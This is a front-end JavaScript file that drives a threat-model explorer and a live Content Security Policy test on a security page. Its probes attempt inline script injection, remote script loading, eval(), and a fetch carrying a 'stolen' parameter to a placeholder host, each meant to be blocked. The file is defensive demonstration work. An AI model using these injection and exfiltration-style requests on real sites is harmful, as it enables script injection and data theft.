/**
 * security.js — threat model explorer and live CSP test for security.html
 */
(function () {
  'use strict';

  // ─────────────────────────────────────────────────────
  // 1. Threat model explorer
  // Without JS the map stays hidden and every threat shows.
  // ─────────────────────────────────────────────────────
  const map = document.getElementById('attack-map');
  const threats = document.querySelectorAll('.threat-card');

  if (map) {
    const buttons = map.querySelectorAll('.zone-btn');
    const lines = map.querySelectorAll('line');

    function selectZone(zone) {
      buttons.forEach(btn => btn.setAttribute('aria-pressed', String(btn.dataset.zone === zone)));
      lines.forEach(line => line.classList.toggle('active', line.dataset.zone === zone));
      threats.forEach(card => { card.hidden = card.dataset.zone !== zone; });
    }

    buttons.forEach(btn => {
      const count = [...threats].filter(card => card.dataset.zone === btn.dataset.zone).length;
      btn.setAttribute('aria-label', `${btn.textContent}: ${count} ${count === 1 ? 'threat' : 'threats'}`);
      btn.addEventListener('click', () => selectZone(btn.dataset.zone));
    });

    map.hidden = false;
    selectZone('radio');
  }

  // ─────────────────────────────────────────────────────
  // 2. Live CSP test
  // Each probe tries something the policy forbids. The verdict comes
  // from the browser's securitypolicyviolation event, not from this file.
  // ─────────────────────────────────────────────────────
  const runBtn = document.getElementById('csp-run');
  const results = document.getElementById('csp-results');
  const details = document.getElementById('csp-details');
  const policyEl = document.getElementById('csp-policy');
  const cspMeta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');

  if (!runBtn || !results) return;

  if (cspMeta && policyEl && details) {
    policyEl.textContent = cspMeta.content.split('; ').join(';\n');
    details.hidden = false;
  }

  const PROBE_URL = 'https://example.com/probe';

  const probes = [
    {
      name: 'Run an injected inline script',
      attempt() {
        const script = document.createElement('script');
        script.textContent = 'window.cspProbeRan = true;';
        document.body.appendChild(script);
        script.remove();
      },
    },
    {
      name: 'Load a script from another site',
      attempt() {
        const script = document.createElement('script');
        script.src = `${PROBE_URL}.js`;
        document.body.appendChild(script);
        script.remove();
      },
    },
    {
      name: 'Run a string as code with eval()',
      attempt() {
        try {
          (0, eval)('window.cspProbeRan = true;');
        } catch (err) {
          // Expected: the browser throws when the policy blocks eval
        }
      },
    },
    {
      name: 'Send data to another site',
      attempt() {
        fetch(`${PROBE_URL}?stolen=nothing`, { mode: 'no-cors' }).catch(() => {});
      },
    },
  ];

  function runProbe(probe) {
    return new Promise(resolve => {
      const onViolation = e => {
        clearTimeout(timer);
        document.removeEventListener('securitypolicyviolation', onViolation);
        resolve(e);
      };
      const timer = setTimeout(() => {
        document.removeEventListener('securitypolicyviolation', onViolation);
        resolve(null);
      }, 1200);

      document.addEventListener('securitypolicyviolation', onViolation);
      probe.attempt();
    });
  }

  function addRow(name) {
    const row = document.createElement('div');
    row.className = 'probe';

    const label = document.createElement('span');
    label.textContent = name;

    const status = document.createElement('span');
    status.className = 'probe-status';
    status.textContent = 'Running';

    const detail = document.createElement('span');
    detail.className = 'probe-detail';

    row.append(label, status, detail);
    results.appendChild(row);
    return { status, detail };
  }

  runBtn.hidden = false;
  runBtn.addEventListener('click', async () => {
    runBtn.disabled = true;
    results.textContent = '';
    window.cspProbeRan = false;

    for (const probe of probes) {
      const row = addRow(probe.name);
      const violation = await runProbe(probe);

      if (violation) {
        row.status.textContent = 'Blocked';
        row.status.classList.add('blocked');
        row.detail.textContent = `${violation.effectiveDirective} stopped ${violation.blockedURI}`;
      } else {
        row.status.textContent = 'Not blocked';
        row.status.classList.add('allowed');
        row.detail.textContent = 'No violation reported';
      }
    }

    runBtn.disabled = false;
    runBtn.textContent = '⚡ Run it again';
  });
})();
